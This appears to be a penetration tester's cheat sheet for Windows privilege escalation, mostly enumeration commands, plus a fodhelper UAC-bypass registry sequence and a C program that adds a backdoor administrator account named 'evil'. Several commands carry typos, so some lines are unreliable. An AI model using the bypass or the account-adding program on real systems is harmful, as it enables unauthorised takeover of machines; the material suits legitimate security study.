## Windows privilege Escalation

* Automated enumeration scripts

```
// https://github.com/pentestmonkey/windows-privesc-check
windows-privesc-check2.exe --dump -a -o report.txt
```

* Enumerating Users

```
echo %username%
whoami
whoami /all		#groups, permissions, etc
whoami /groups	# check cmd integrity level
net user
net user <username>
```

* Get System information

```
systeminfo | findst r /B /C: "OS Name" /C:"OS Version" /C:"System Type"
hostname
```

* Enumerating Running Processes and Services

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

tasklist / SVC
```

* Enumerating Networking Information

```
ipconfig /all
route print
netstat -ano
```

* Enumerating Firewall Status and Rules

```
netsh advfirewa11 show currentprofile
netsh advfirewall firewall show rule name=all
```

* Enumerating Scheduled Tasks

```
schtasks /query /fo LIST /v
```

* Enumerating Installed Applications and Patch Levels

```
// Does not list applications that do not use the Windows Installer
wmic product get name, version, vendor

wmic qfe get Caption, Description, HotFixID, InstaltedOn
```

* Enumerating Readable/Writable Files and Directories

```
accesschk.exe -uws "Everyone" "C:\Program Files"

// powershell cmdlet
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

* Enumerating Unmounted Disks

```
mountvol
```

* Enumerating Device Drivers

```
// list drivers, use powershell to filter output
driverquery.exe / v / fo csv | Convertfrom-CSV | Select-Object 'Display Name', ' Start Mode', 'Path'

// Get driver version and other details 
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

* Enumerating Binaries That AutoElevate

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

// If any of this key is enabled (set to 1), we could craft an MSI file and run it to elevate our privileges.
```

* Elevating Medium to High integrity shell using fodhelper(admin required)

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
C:\Windows\System32\fodhelper.exe
```

* Checking file permissions

```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
```

* C program to create admin user - compile with gcc to create exeutable

```
#include <stdlib.h>
int main ()
{
int i;
i = system ( "net user evil Ev!lpass /add") ;
i = system ("net localgroup administrators evil /add");
return 0;
}
```